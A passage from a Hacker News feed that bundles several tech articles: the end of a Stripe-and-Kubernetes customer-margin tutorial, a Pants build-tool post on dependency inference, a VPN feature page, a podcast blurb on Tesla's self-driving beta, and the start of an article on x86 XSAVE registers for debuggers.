    cost = res.json().get('data', {}).get('pod_cost_aggregate', {}).get('aggregate', {}).get('sum', {}).get('cost')
    CUSTOMERS[name]['cost'] = cost
print(pd.DataFrame(CUSTOMERS))</pre><p>Great! Now, I have a side by side comparison of customers (namespaces) and cost (spend).</p><figure><img src="https://cdn.spark.app/media/self3/image/screen_shot_2020_10_20_at_7.58.02_pm_w720.png" alt=""></figure><figure><img src="https://cdn.spark.app/media/self3/image/screen_shot_2020_10_20_at_9.05.35_pm_w720.png" alt=""></figure><p><span>[The graph above was pulled from Octane UI]</span></p><p>As you can see in the tables and graphs above, I have real-time visibility into our most expensive customers (Mike SpendALot) and cost-efficient customers (stingy-sid, slow-sally).  </p><h3>Revenue per customer</h3><h4><span>Now that I have cost per customer, I need to overlay that data with revenues from Stripe to get real-time margins per customer.</span></h4><p>First, I start by getting customer subscriptions. </p><pre>import stripe
stripe.api_key = 'STRIPE_API_KEY'
customers = { customer.id: customer for customer in stripe.Customer.list().data}
subscriptions = { subscription.customer: subscription for subscription in stripe.Subscription.list().data}</pre><p>Now I need to convert subscriptions to revenue. Revenue is extrapolated from the unit price of a customer subscription. <span>[Note that revenue structure may be more complex when using other Stripe features (e.g. metered billing, discounts, trials, etc.)].</span></p><pre>for customer in customers:
    subscription = subscriptions.get(customer)
    if subscription:
        customer_name = customers[customer].name
        customer_subscription_price = subscription.get('items', {}).get('data')[0].price
        interval_seconds = pd.Timedelta(f"{customer_subscription_price.recurring.interval_count} {customer_subscription_price.recurring.interval}").total_seconds()
        price_per_hour = (customer_subscription_price.unit_amount / 100.0) / (interval_seconds / HOURS_TO_SECONDS)
        CUSTOMERS[customer_name]['revenue'] = price_per_hour * LOOKBACK_HOURS
print(pd.DataFrame(CUSTOMERS))</pre><figure><img src="https://cdn.spark.app/media/self3/image/screen_shot_2020_10_20_at_7.59.30_pm_w720.png" alt=""></figure><p>Excellent, now I have customer, cost, and revenue grouped together. All that is left to do is compute margins. </p><pre>for name, details in CUSTOMERS.items():
    CUSTOMERS[name]['pct_margin'] = 100 * (details['revenue'] - details['cost']) / details['revenue']
print(pd.DataFrame(CUSTOMERS))</pre><figure><img src="https://cdn.spark.app/media/self3/image/blank_diagram_17_w720.png" alt="Margin analytics"></figure><p>Viola! I have calculated real-time margins per customer. I can quickly see that Mike SpendAlot is bring me the lowest percent margins. </p><h3>Conclusion</h3><p>Calculating customer cost for SaaS companies is complex. By leveraging Octane and Stripe,√Ç&nbsp;I can capture, segment, and visualize customer costs in real-time to answer valuable business questions. The example above enabled us to differentiate between my low and high margin customers (Stingy Sid vs Mike SpendALot). It allowed us to do it real-time and on an ongoing basis, which is especially useful as my products, customers and business evolve.</p><p><span>I hope to spark discussion around the potential of leveraging infrastructure to inform business performance. I've made several assumptions and simplifications around the complexities of margin as there is no cookie-cutter solution. </span></p><p>If you have any thoughts or questions we would love to hear from you - email me at akash@getoctane.io.</p><p><em><span>*I define cost per customer as the recurring infrastructure costs attributed to a customer's usage.  Please note that infrastructure may only be a part of recurring costs.  Cost of revenue can include other significant components not covered here (e.g. DevOps, customer success, support). </span></em></p><p><em><span>**In this walk-through, there is a single revenue stream. However, SaaS companies may have multiple revenue streams including professional services. It is important to compute margin separately for different revenue streams.</span></em></p>
          
          
        </article></div>]]>
            </description>
            <link>https://www.getoctane.io/per-customer-margins-using-stripe-and-kubernetes</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937290</guid>
            <pubDate>Thu, 29 Oct 2020 23:22:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dependency inference in Pants 2.0.0: Precise caching without the boilerplate]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24937228">thread link</a>) | @stuhood
<br/>
October 29, 2020 | https://blog.pantsbuild.org/dependency-inference/ | <a href="https://web.archive.org/web/*/https://blog.pantsbuild.org/dependency-inference/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: markdown--><p>As discussed <a href="https://blog.pantsbuild.org/introducing-pants-v2/">in our post announcing Pants v2</a>, it's clear that Python has "grown up" by gaining facilities to help it to scale to larger projects. But as codebases grow and tool counts increase, more Python codebases need build tools. While you could write bespoke scripts to coordinate each of your tools, using Pants brings benefits like caching, concurrency, introspection, a simple and uniform user experience, and more!</p>
<p>Unfortunately, scalable build tools have historically meant a significant boilerplate burden: scattering <code>BUILD</code> files throughout your repository and then needing to edit both your code and the redundant dependency information in build definitions.</p>
<p>But it doesn‚Äôt have to be that way! Pants v2 supports the precise caching, concurrency, and introspection that you need to scale your repository, with up to <strong>90%</strong> less <code>BUILD</code> boilerplate, thanks to‚Ä¶ Dependency inference!</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="scalingup">Scaling up</h2>
<p>Pants supports repos of all sizes with minimal boilerplate, but it is particularly helpful in repositories containing multiple deployable or publishable projects, each with potentially different requirements or interpreters: aka, monorepos.</p>
<p>Monorepos have lots of benefits (no dependency conflicts, atomic cross-project commits, easy top-to-bottom continuous integration, linear change history), but essential to making them scale are the abilities to:</p>
<ol>
<li>test, check, and deploy precisely the portion of the repository that is relevant to you</li>
<li>cache builds and tests to avoid re-building when unrelated code has changed</li>
<li>manage and configure the variety of tooling that users of the repository will want to use</li>
</ol>
<p>It's critical in a monorepo to be able to test, check, and deploy exactly the relevant portion of your code, ideally with zero impact from changes in unrelated parts of the codebase. For example: if you have three libraries <code>A</code>, <code>B</code>, and <code>C</code>, which depend on one another in a chain like <code>A -&gt; B -&gt; C</code>, a monorepo that builds from source using Pants allows you to completely ignore versioning (and <code>setup.py</code> files, per-project <code>requirements.txt</code>, etc) while you edit library <code>C</code>, even if you are running the tests for library <code>A</code>. If you have ten other projects (or one thousand!) in your repository and only a few of them depend on <code>C</code>, you'd like to avoid ever running tests or mypy for the unrelated libraries while editing <code>C</code>.</p>
<p>And in those cases when you <em>do</em> want to take advantage of a monorepo's top-to-bottom integration testing by running "all of your dependent's tests" (or maybe just typecheck them with Mypy!), you'd like to do that as quickly as possible by taking advantage of caching, concurrency, or transparently executing them on a cluster of machines using remote execution.</p>
<p>To enable this scalability, monorepo build tools like Pants v1 and Bazel required that the dependencies between libraries and files were declared in <code>BUILD</code> files. These dependencies were then used to determine which portions of the repository needed to be built, and which files needed to be included in cache keys.</p>
<p>"But wait", you say! "Doesn't that mean we've traded editing <code>setup.py</code> and <code>requirements.txt</code> files for every library for editing <code>BUILD</code> files for every library?" In most tools, that would be the case: but not in Pants v2! Pants v2 is different.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="dependencyinference">Dependency inference</h2>
<p>Pants 2.0.0 almost entirely eliminates the boilerplate of declaring dependencies between libraries thanks to "Dependency inference". Dependency inference is roughly what it sounds like: Pants supports discovering the dependencies between Python libraries by parsing <code>import</code> statements (and you can <a href="https://www.pantsbuild.org/docs/plugins-overview">use our powerful plugin API</a> to infer other dependencies, such as by parsing a Django settings file, YAML config, etc).</p>
<p>Rather than adding an <code>import</code> statement to your code resulting in your tests failing because you forgot to <em>also</em> update a <code>BUILD</code> file, Pants will use your newly added <code>import</code> statement to infer that that file now has a dependency within the repository (or outside it via your <code>requirements.txt</code>). When designing inference, we strove to remove boilerplate without introducing magic, so <code>BUILD</code> files are still used to declare any metadata your library might have (the version of the Python interpreter to use, etc), and can be used to <a href="https://www.pantsbuild.org/docs/targets#dependencies-and-dependency-inference">override or extend</a> the inferred dependencies.</p>
<p>Even better, Pants infers these dependencies <em>at the file level</em>. Rather than adding a dependency from "the library named <code>A</code>" to "the library named <code>B</code>" (or "target" in monorepo parlance), Pants tracks that "file <code>a.py</code> depends on file "<code>b.py</code>". Rather than staring at the content of your <code>BUILD</code> files to (attempt to?) understand your dependencies, you can use Pants' dependency introspection tools to easily explore them at the file level: <code>./pants dependencies $file</code>.</p>
<p>In practice, we‚Äôve found that inferred file-level dependencies can reduce the total per-file dependency count by an average of <strong>30%</strong> (improving cache hit rates), and reduce the size of <code>BUILD</code> files by up to <strong>90%</strong> (reducing boilerplate)! See our docs for <a href="https://www.pantsbuild.org/docs/how-does-pants-work#dependency-inference">a real world example</a>.</p>
<p>And critically (as we‚Äôll discuss in further posts!), dependency inference is both 1) very safe, and 2) very fast. Because Pants invokes processes hermetically using SHA256 fingerprinting and strong sandboxes (your test frameworks, your linters, mypy, everything), failing to infer a dependency can never cause the wrong things to be cached. And because the core of Pants is implemented in Rust ‚Äî and uses a daemon, parallelism, and very-fine-grained memoization ‚Äî inference won‚Äôt slow you down!</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="demonstration">Demonstration</h2>
<p>To show what it‚Äôs like to use dependency inference, we‚Äôll quickly add a feature with assistance from some new first and third party dependencies (from sources and PyPI, respectively).</p>
<p>We‚Äôll start with a broken test that expects TOML files to be supported by a library in a different directory:</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/1.gif" alt=""></figure><!--kg-card-begin: markdown--><p>Because we‚Äôre curious, we‚Äôll start by asking Pants whether the library already (directly) depends on TOML:</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/2.gif" alt=""></figure><!--kg-card-begin: markdown--><p>Nope. Only YAML. But let‚Äôs add the <code>import</code> statement and see what happens‚Ä¶</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/3.gif" alt=""></figure><!--kg-card-begin: markdown--><p>Voila! This file now declares a dependency on TOML via the <code>import</code> statement, without any modifications to <code>BUILD</code> files. But we‚Äôre not finished: neither the flake8 linter nor the customer will be satisfied with an unused <code>import</code>! Let‚Äôs finish adding the feature, and then re-run the test.</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/4.gif" alt=""></figure><!--kg-card-begin: markdown--><p>Ok, TOML is clearly being used: but this time our test needs tweaking. To fix it we can import a <code>TomlSerializer</code> helper class from a second library (another new dependency!). We already know that we don‚Äôt need to check the <code>BUILD</code> file to see whether this test declares a dependency on the library, so we can just focus on our code!:</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/5.gif" alt=""></figure><!--kg-card-begin: markdown--><p>Great: our test is now passing! To fix it, we edited two files and introduced two new dependencies -- but we didn‚Äôt need to edit any <code>BUILD</code> files, despite these files living in different targets!</p>
<p>Finally, let‚Äôs confirm the critical monorepo scalability property that edits to unrelated files don‚Äôt invalidate the caching of our new test. Although this test is quick, there are a few hundred files in this repository, and plenty of other tests that could take long enough to result in coffee breaks!:</p>
<!--kg-card-end: markdown--><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/6.gif" alt=""></figure><!--kg-card-begin: markdown--><p>Excellent! Thanks to dependency inference‚Äôs file level precision, our test is still quickly and correctly cached, even after editing neighboring files in the target! Productivity preserved; mission accomplished.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="conclusion">Conclusion</h2>
<p>The precise, always-accurate dependencies in Pants have a lot of benefits:</p>
<ol>
<li>teams can quickly get started using Pants</li>
<li><code>BUILD</code> files (or <code>requirements.txt</code>/<code>setup.py</code> files) can't go out of sync with the code, because you don't need to repeat all of your <code>import</code> statements there</li>
<li>the cache keys for processes (and thus the number of cache hits and amount of rebuilding) are more accurate and much more fine-grained than you would ever write by hand</li>
</ol>
<p>If you're interested in speeding-up and scaling-up your builds without the boilerplate, the <a href="https://www.pantsbuild.org/docs/community">Pants community would love to help</a>!</p>
<!--kg-card-end: markdown-->
			</section></div>]]>
            </description>
            <link>https://blog.pantsbuild.org/dependency-inference/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937228</guid>
            <pubDate>Thu, 29 Oct 2020 23:14:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The most advanced VPN and unblocker with industry-first features]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24937073">thread link</a>) | @Oeck
<br/>
October 29, 2020 | http://www.oeck.com/features/ | <a href="https://web.archive.org/web/*/http://www.oeck.com/features/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		<!--XF:EXTRA_OUTPUT-->

		

		

		
	

		
	<!--[if lt IE 9]><div class="blockMessage blockMessage&#45;&#45;important blockMessage&#45;&#45;iconic">You are using an out of date browser. It  may not display this or other websites correctly.<br />You should upgrade or use an <a href="https://www.google.com/chrome/browser/" target="_blank">alternative browser</a>.</div><![endif]-->


		
			<div>
			
				
					
				

				
					<p>The things that make us different.</p>
				
			
				
			</div>
		

		<div>
			

			<div>
				
				<div>

	



	
	
	










	<div>
	<div data-aos="fade-up">
		<div>
			<p><img src="http://www.oeck.com/assets/images/web/png/500/smartRouting.png">
			</p>
			<div>
				<div>
					<p><img src="http://www.oeck.com/assets/images/web/png/500/smartRouting.png"></p><p>
					<span>smartRouting</span>
					<br>
					Oeck takes away the need of connecting to a specific region to access streaming content. Get access to the latest shows from around the world without ever switching regions. Our revolutionary smartRouting unblocks some of the most popular services from around the globe. Enjoy fast, automated access to itv in the UK - Hulu in the US - iView in Australia and many more. Simply connect to the VPN location closest to you and we take care of the rest! 
					</p>
					
				</div>				
			</div>
		</div>
	</div>
</div>

<div>
	<div data-aos="fade-up">
		<div>
			<div>
				<p><img src="http://www.oeck.com/assets/images/web/png/500/deviceProfiles.png"></p><p>
				<span>Device Profiles</span>
				<br>
				Device Profiles allow you to take your VPN functionality to the next level. This handy feature allows you to set preferences for streaming services and traffic filtration on a per-device level.
					By doing this you can quickly set up a childs device to block adult content whilst keeping your other devices untouched. It also allows you to set up devices with different streaming regions.
					For example, you can have Netflix USA on one device, Netflix UK on another and Netflix Germany on yet another, whilst all the while being connected to the VPN region closest to you!
				</p>
				
			</div>
			<p><img src="http://www.oeck.com/assets/images/web/png/500/deviceProfiles.png">
			</p>
		</div>
	</div>
</div>

<div>
	<div data-aos="fade-up">
		<div>
			<p><img src="http://www.oeck.com/assets/images/web/png/500/adBlocker.png">
			</p>
			<div>
				<p><img src="http://www.oeck.com/assets/images/web/png/500/adBlocker.png"></p><div>
				<p><span>Cerberus</span>
				<br>
				Get powerful device-level filtering to prevent dangerous content reaching your family and devices. Our unique online guardian Cerberus is the must-have feature for families and individuals. Choose which content to block and prevent threats before they occur. Simply create a profile for your device and select the Cerberus services required.
					</p><p>
					
					You can filter Ads, Malware and Phishing, Adult and Social Networking sites individually or combined!
				</p></div>
				
			</div>
		</div>
	</div>
</div>

<div>
	<div>
		<div>
			<div>
				<p><span>Security</span>
					<br>
					<span>Built deep into our network and culture.</span>
				</p>
				<div data-aos="fade-up"><p>
					We secure your privacy using industry-leading encryption standards, on servers that we own. Our zero hard drive system won‚Äôt store any of your data, ever! Quickly block dangerous sites and services at the DNS level to prevent ads, malware, phishing sites and more.
					</p>
					
				</div>
			</div>
		</div>
	</div>	
</div>

<div>
	<div>
		<div data-aos="fade-up">
			<p><span>AES-256</span>
				<br>
				<span>Encryption</span>
			</p>
			<p><span>4096-bit</span>
				<br>
				<span>Key Exchange</span>
			</p>
			<p><span>Zero</span>
				<br>
				<span>Hard Drives</span>
			</p>
			<p><span>Zero</span>
				<br>
				<span>Logging</span>
			</p>
		</div>
	</div>
</div>

<div>
	<div data-aos="fade-up">
		<div>
			<p><img src="http://www.oeck.com/assets/images/web/png/500/portForwarding.png">
			</p>
			<div>
				<p><img src="http://www.oeck.com/assets/images/web/png/500/portForwarding.png"></p><p>
				<span>Advanced Port Forwarding</span>
				<br>
				This is a simple but handy feature with a twist. We issue you ports and you enable ports you select on your device profile(s). Then you simply tell us which port you would like to forward to. No need to configure your client or software to suit us. As an added bonus, you get your very own custom domain name per port. Regardless of which VPN region you connect to, your port-forwarding will always work!
				</p>
				
			</div>
		</div>
	</div>
</div>

<div>
	<div data-aos="fade-up">
		<div>
			<div>
				<p><img src="http://www.oeck.com/assets/images/web/png/500/customFilter.png"></p><p>
				<span>Custom DNS Filter</span>
				<br>
				Our built-in DNS filter allows you to decide what internet traffic you want hitting your device(s). Simply populate your filter list with websites that you want blocked and Oeck's VPN will follow those rules and block the traffic. Domain black lists can be set on a per-device level, which makes is perfect for parents who would like to restrict what their children can access. Best of all, it is completely unique to you.
				</p>
				
			</div>
			<p><img src="http://www.oeck.com/assets/images/web/png/500/customFilter.png">
			</p>
		</div>
	</div>
</div>

<div>
	<div data-aos="fade-up">
		<div>
			<p><img src="http://www.oeck.com/assets/images/web/png/500/customDNS.png">
			</p>
			<div>
				<p><img src="http://www.oeck.com/assets/images/web/png/500/customDNS.png"></p><p>
				<span>Secondary DNS</span>
				<br>
				A feature built for advanced users. Secondary DNS allows you to specify a DNS service to use that will bypass Oeck's DNS. To further simplify the feature, you can still allow Oeck to take control of some of the DNS queries and leave others up to your Secondary DNS.
				</p>
				
			</div>
		</div>
	</div>
</div>

<div>
	<div data-aos="fade-up">
		<div>
			<div>
				<p><img src="http://www.oeck.com/assets/images/web/png/500/serverSelection.png"></p><p>
				<span>Automatic Server Selection</span>
				<br>
				When selecting a VPN region to connect to, our network runs a check of the available servers and resources within that region. It then calculates which server will be the best server for you to connect to. It takes into account the available system resources of each server and so it will always connect you to the best available server. No more server surfing ever again!
				</p>
				
			</div>
			<p><img src="http://www.oeck.com/assets/images/web/png/500/serverSelection.png">
			</p>
		</div>
	</div>
</div>




	




</div>
				
			</div>

			
		</div>

		

		
	</div>
</div></div>]]>
            </description>
            <link>http://www.oeck.com/features/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937073</guid>
            <pubDate>Thu, 29 Oct 2020 22:53:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Tesla's ‚ÄúFull Self-Driving‚Äù Beta Is Dangerous]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24937068">thread link</a>) | @edward
<br/>
October 29, 2020 | http://www.autonocast.com/blog/2020/10/29/205-why-teslas-full-self-driving-beta-is-dangerous | <a href="https://web.archive.org/web/*/http://www.autonocast.com/blog/2020/10/29/205-why-teslas-full-self-driving-beta-is-dangerous">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main" data-content-field="main-content" data-controller="FadeInContent">

        <div data-content-field="main-content" data-item-id="5f9adc49f143a331a74f81e2">
  
  <div>
    <p><time datetime="2020-10-29" pubdate="">
      <p><span>Oct </span><span>29</span>
      </p>
    </time></p><h2 data-content-field="title"><time datetime="2020-10-29" pubdate="">Oct 29 </time>#205: Why Tesla's "Full Self-Driving" Beta Is Dangerous</h2>

    
  </div>
  

  <div>
    <article id="article-5f9adc49f143a331a74f81e2">
      
      
      <div data-controller="BlogProgressBar">
        
        
        <div><div data-layout-label="Post Body" data-type="item" data-updated-on="1603984847303" id="item-5f9adc49f143a331a74f81e2"><div><div><div data-block-type="2" id="block-9a8824872b6136df9550"><p>Tesla's deployment of a "limited beta" version of its "Full Self-Driving" software to public roads raises a number of important issues around how and why AV developers test safely on public roads. With Kirsten just getting back from vacation, Alex and Ed walk her through the most immediate concerns... plus, Alex shares what it's like to be trained as a professional AV safety driver.</p></div></div></div></div></div>

        

        

        <section>
          
        </section>
      </div>
      

    </article>
  </div>



<section>
  <!--
  --><a href="http://www.autonocast.com/blog/2020/10/23/204-nancy-sun-and-randol-aikin-of-ike">
    
    <span>
      
      <h2><time datetime="2020-10-23" pubdate="">Oct 23 </time>#204: Nancy Sun and Randol Aikin of Ike</h2>
    </span>
  </a>
</section>



  
    
        
        <section id="related" data-controller="RelatedPostImages">
          <article id="article-5ac569d0758d4611a989addb" data-item-id="5ac569d0758d4611a989addb" data-item-title="#67: Another Autopilot Crash">
                

                

              </article><article id="article-5c924e0df4e1fc4c55436848" data-item-id="5c924e0df4e1fc4c55436848" data-item-title="135: The Autonocast's SXSW Panel On Automated Driving Terminology">
                

                

              </article><article id="article-5c94f2f14192023ec16f89c2" data-item-id="5c94f2f14192023ec16f89c2" data-item-title="136: Lessons Learned In The Year Since The Death Of Elaine Herzberg">
                

                

              </article>
        </section>
      
  
</div>

      </div></div>]]>
            </description>
            <link>http://www.autonocast.com/blog/2020/10/29/205-why-teslas-full-self-driving-beta-is-dangerous</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937068</guid>
            <pubDate>Thu, 29 Oct 2020 22:52:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Debuggers Work: Getting and Setting x86 Registers, Part 2: Xsave]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937023">thread link</a>) | @fcambus
<br/>
October 29, 2020 | https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-2/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>In the previous part of this article, I have described the basic methods
of getting and setting the baseline registers of 32-bit and 64-bit x86
CPUs.  I have covered General Purpose Registers, baseline Floating-Point
Registers and Debug Registers along with their <code>ptrace(2)</code> interface.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/xsave.svg" alt="XSAVE"></p>

<p>In the second part, I would like to discuss the <code>XSAVE</code> family
of instructions.  I will describe the different variants of this
instruction as well as explain the differences between them and their limitations.
Afterwards, I will compare the <code>ptrace(2)</code> API used to access its data
on Linux, FreeBSD and NetBSD.  Other systems such as OpenBSD
or DragonFly BSD do not provide requests to retrieve or set extended
registers, so the comparison may help them design their own APIs.</p>

<p>As I‚Äôve explained earlier, the discussed instructions are necessary
to implement <em>context switching</em> ‚Äî the mechanism used by the Operating
System to run multiple threads and processes quasi-simultaneously
on the same processor.  In order to perform that, the kernel needs
to be able to save the values of all registers used by the program,
and restore them afterwards.  This information is also exposed
to debuggers in order to provide them with means to introspect and alter
the state of debugged programs.</p>

<p>The instructions described in the first part were sufficient to describe
the registers used up to the early generations of Intel Core CPUs.
However, as the next generations of processors introduced new
instruction sets, it eventually became necessary to introduce new
registers as well.  In 2011, the <abbr title="Advanced Vector Extensions">AVX</abbr>
extensions present first in Intel‚Äôs Sandy Brige and afterwards in AMD‚Äôs
Bulldozer microarchitecture doubled the sizes of earlier XMM registers,
creating 16 new YMM registers.</p>

<p>The new registers can be used to store twice as large vectors of data,
and perform operations on all of their elements simultaneously.  This
is particularly useful for heavy computations, for example in multimedia
or cryptographic applications.  Examples of programs that can explicitly
take advantage of AVX instructions to improve their performance include
the FFmpeg media decoding and encoding library or OpenCV image manipulation
library.</p>

<p>As applications start using the new registers, it becomes necessary
for the kernel to be able to save and restore them as part of context
switching ‚Äî otherwise the programs would lose data!  The <code>XSAVE</code>
instruction set serves exactly that purpose.  It was introduced
in the newer versions of Intel Core microarchitecture (2008).  It is
used both in the 64-bit and 32-bit mode (although 32-bit programs can use
only a subset of the exposed registers).</p>

<p>The <code>XSAVE</code> instruction extends the format used by <code>FXSAVE</code> to
include additional register sets.  However, unlike the earlier saving
instructions, it is not strictly limited to a fixed data set.  Instead,
it makes it possible to introduce support for new CPU extensions without
the necessity of adding a next <code>XSAVE</code> variant or breaking
compatibility with existing software.  Furthermore, it accounts
for the possibility that some processors may choose not to implement
interim instruction sets.</p>

<h2 id="the-state-components">The State Components</h2>

<p><code>XSAVE</code> revolves around the concept of <em>State Components</em>.  A state
component represents a single subset of data that can be saved or
restored independently.  There are two special state components
corresponding to the original <code>FXSAVE</code> instruction: the x86 state
component, and the SSE state component.  Further instruction sets
introduce one or more components each.</p>

<p>In modern processors, there are two kinds of state components: user state
components and supervisor state components.  The former group represent
regular registers that are accessible to userspace programs, the latter
involves privileged registers that should not be exposed to regular
programs.</p>

<p>The individual state components are controlled via the <em>State Component
Bitmap</em>.  This bitmap is used by <code>XSAVE</code> to determine which
instruction sets to save, and by <code>XRSTOR</code> to determine which to
restore (or reset).  Enabling the respective bits causes additional
data to be saved to the memory, effectively requiring larger storage
area.</p>

<p>In order to make it possible to save a particular state component
or to use the respective registers in a program, the kernel needs
to enable its tracking in one of the control registers.  These control
registers are XCR0 for user components, and IA32_XSS for supervisor
components.  Both use the same bit numbers as the state component
bitmap.</p>

<table>
  <caption>State Component Bitmap</caption>
  <tbody><tr>
    <th>Bit</th>
    <th>Instr. set</th>
    <th>User <abbr title="State Component">SC</abbr> (XCR0)</th>
    <th>Supervisor <abbr title="State Component">SC</abbr> (IA32_XSS)</th>
    <th>Size (bytes)</th>
  </tr>
  <tr>
    <td>0</td>
    <td>x87</td>
    <td><abbr title="x87 FPU control registers and ST(0)..ST(7) registers">x87 state</abbr></td>
    <td>reserved</td>
    <td rowspan="2">512</td>
  </tr>
  <tr>
    <td>1</td>
    <td><abbr title="Streaming SIMD Extensions">SSE</abbr></td>
    <td><abbr title="XMM0..XMM15 and MXCSR registers">SSE state</abbr></td>
    <td>reserved</td>
  </tr>
  <tr>
    <td>2</td>
    <td><abbr title="Advanced Vector Extensions">AVX</abbr></td>
    <td><abbr title="Higher 128 bits of YMM0..YMM15 registers (lower 128 bits overlap with XMM registers)">YMM_Hi128</abbr></td>
    <td>reserved</td>
    <td>256</td>
  </tr>
  <tr>
    <td>3</td>
    <td rowspan="2"><abbr title="Memory Protection Extensions">MPX</abbr></td>
    <td><abbr title="Bound Registers BND0..BND3">BNDREGS</abbr></td>
    <td>reserved</td>
    <td>64</td>
  </tr>
  <tr>
    <td>4</td>
    <td><abbr title="Bound Control and Status Registers">BNDCSR</abbr></td>
    <td>reserved</td>
    <td>16</td>
  </tr>
  <tr>
    <td>5</td>
    <td rowspan="3"><abbr title="512-bit extensions to Advanced Vector Extensions">AVX-512</abbr></td>
    <td><abbr title="Opmask registers K0..K7">opmask</abbr></td>
    <td>reserved</td>
    <td>64</td>
  </tr>
  <tr>
    <td>6</td>
    <td><abbr title="Higher 256 bits of ZMM0..ZMM15 registers (lower 256 bits overlap with YMM registers)">ZMM_Hi256</abbr></td>
    <td>reserved</td>
    <td>512</td>
  </tr>
  <tr>
    <td>7</td>
    <td><abbr title="16 higher ZMM registers (ZMM16..ZMM31)">Hi16_ZMM</abbr></td>
    <td>reserved</td>
    <td>1024</td>
  </tr>
  <tr>
    <td>8</td>
    <td><abbr title="Processor Trace">PT</abbr></td>
    <td>reserved</td>
    <td><abbr title="Control registers of PT extension">PT</abbr></td>
    <td>72</td>
  </tr>
  <tr>
    <td>9</td>
    <td><abbr title="Protection Key Rights for User Pages">PKRU</abbr></td>
    <td><abbr title="Protection Key Rights for User Pages register">PKRU</abbr></td>
    <td>reserved</td>
    <td>4</td>
  </tr>
  <tr>
    <td>13</td>
    <td><abbr title="Hardware Duty Cycling">HDC</abbr></td>
    <td>reserved</td>
    <td><abbr title="Hardware Duty Cycling state">HDC</abbr></td>
    <td>8</td>
  </tr>
</tbody></table>

<h2 id="the-xsave-area-format">The XSAVE Area Format</h2>

<p>The data format used by the <code>XSAVE</code> instruction is called the <em>XSAVE
Area</em>.  The XSAVE Area consists of three parts: the 512-byte <em>legacy
region</em> that is the same as used by <code>FXSAVE</code> instruction, followed
by the 64-byte <em>XSAVE header</em> containing information about the data
present in the XSAVE Area, followed by the variably sized <em>extended
region</em> used to store additional state components.</p>

<p>Similarly to <code>FXSAVE</code>, all <code>XSAVE</code> instructions have their -64
counterparts (e.g. <code>XSAVE64</code>) that differ in the way FIP and FDP
registers are saved in the legacy region.  More information on this,
along with a table describing the legacy region in detail, can be found
in the previous part of the article,
<a href="https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/#fxsave-vs-fxsave64">FXSAVE vs FXSAVE64</a> section.</p>

<p>The XSAVE header currently contains two 64-bit fields whose values
correspond to the state-component bitmaps: XSTATE_BV and XCOMP_BV.
XSTATE_BV is written by <code>XSAVE</code> to indicate that a particular state
component has been written to the extended region, and read by
<code>XRSTOR</code> to determine whether the component is to be restored
from this region (bit set) or reset to the default state (bit clear).
XCOMP_BV is written by the compacting variants of <code>XSAVE</code> to indicate
that the compact form of XSAVE Area is being used and which components
are present in it, and read by <code>XRSTOR</code> to distinguish this format.</p>

<table>
  <caption>The XSAVE header layout</caption>
  <tbody><tr>
    <th>64</th>
    <th>0</th>
    <th>bits</th>
  </tr>
  <tr>
    <td>XCOMP_BV</td>
    <td>XSTATE_BV</td>
    <td>0</td>
  </tr>
  <tr>
    <td rowspan="3" colspan="2">reserved</td>
    <td>128</td>
  </tr>
  <tr>
    <td>256</td>
  </tr>
  <tr>
    <td>384</td>
  </tr>
</tbody></table>

<p>The extended region can be written either in the standard or compact
format.  In the standard format, each state component is placed
at a fixed offset defined by the processor (and available via
<code>CPUID</code>).  If some of the state components are skipped, the relevant
portion of XSAVE Area is gapped to preserve offsets of the successive
components.  In the compact format, the skipped components do not take
up space, and the remaining components are shifted to minimize space
usage.  Therefore, the offsets depend on the components actually being
written, and need to be calculated by software for every invocation.</p>

<table>
  <caption>Example XSAVE Area format</caption>
  <tbody><tr>
    <th>Standard format</th>
    <th>Compact format</th>
  </tr>
  <tr>
    <td>Legacy area<br><small>(512 bytes)</small></td>
    <td>Legacy area<br><small>(512 bytes)</small></td>
  </tr>
  <tr>
    <td>XSAVE header<br><small>(64 bytes)</small></td>
    <td>XSAVE header<br><small>(64 bytes)</small></td>
  </tr>
  <tr>
    <td><abbr title="Higher 128 bits of YMM0..YMM15 registers (lower 128 bits overlap with XMM registers)">YMM_Hi128</abbr><br><small>(256 bytes)</small></td>
